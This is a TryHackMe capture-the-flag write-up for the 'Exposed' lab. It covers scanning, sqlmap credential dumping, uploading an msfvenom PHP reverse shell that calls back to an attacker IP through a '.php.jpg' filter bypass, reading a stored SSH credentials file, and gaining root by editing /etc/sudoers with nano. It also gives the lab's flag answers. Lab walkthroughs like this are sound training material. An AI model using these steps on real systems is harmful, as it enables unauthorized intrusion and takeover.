# Exposed | TryHackMe Write-up

##  Overview

**Room:** Exposed  
**Difficulty:** Easy  
**Tags:** Enumeration, SQL Injection, LFI, File Upload, Privilege Escalation

---

##  Enumeration

### Nmap

Quick port scan:

```bash
sudo nmap -sC -sV -oN <IP>
```



Full port scan:

```bash
nmap -p- -oN nmap_full.txt <IP>
```



**Found:**
- HTTP on port 1337  
- FTP (no useful information)

---

### Gobuster

Directory fuzzing on the web server:

```bash
gobuster dir -u http://<IP>:1337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```


**Discovered directories:** `/admin_101`, `/phpMyAdmin`, `/admin`, `/javascript`

---

##  SQL Injection

Login to `/admin_101` through the login form.  
Intercept the request via Burp Suite and save it as `expose.req`.



### SQLMap

Check for SQL vulnerability:

```bash
python3 sqlmap.py -r expose.req --dump
```



**Database credentials found:**
- Email: `hacker@root.thm`  
- Password: `password123`

Use them to log in to the site.

---

##  File Upload Shell Access

Create a PHP reverse shell using msfvenom:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.146.237 LPORT=4444 -o exploit.php
```

Rename the file to `exploit.php.jpg` to bypass upload filters and upload it via the web form.



URL to trigger the shell:

```
http://<IP>:1337/upload_thm_1001/exploit.php
```

---

### Metasploit Listener Setup

```bash
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 10.11.146.237
set LPORT 4444
run
```



Reverse shell obtained with `www-data` privileges.

---

##  Privilege Escalation

### Accessing user `zeamkish`

Found credentials file:

```
/home/zeamkish/ssh_creds.txt
```

SSH login:

```bash
ssh zeamkish@<IP>
```

### Escalating to root

1. Check available sudo commands:

```bash
sudo -l
```

2. Find SUID binaries:

```bash
find / -type f -perm -4000 2>/dev/null
```

3. Use `/usr/bin/nano` for escalation:

```bash
sudo nano /etc/sudoers
sudo -i
```

Root shell obtained.

---

##  Flags

- **User flag:** `THM{USER_FLAG_1231_EXPOSE}`  
- **Root flag:** `THM{ROOT_EXPOSED_1001}`

---

##  Conclusion

We successfully completed the following steps:

1. Port and web resource scanning  
2. SQL injection to obtain credentials  
3. PHP reverse shell upload via File Upload  
4. Initial shell access as `www-data`  
5. SSH access to user `zeamkish`  
6. Privilege escalation to root via SUID binary

*Screenshots can be added to the `screenshots/` folder for clarity.*
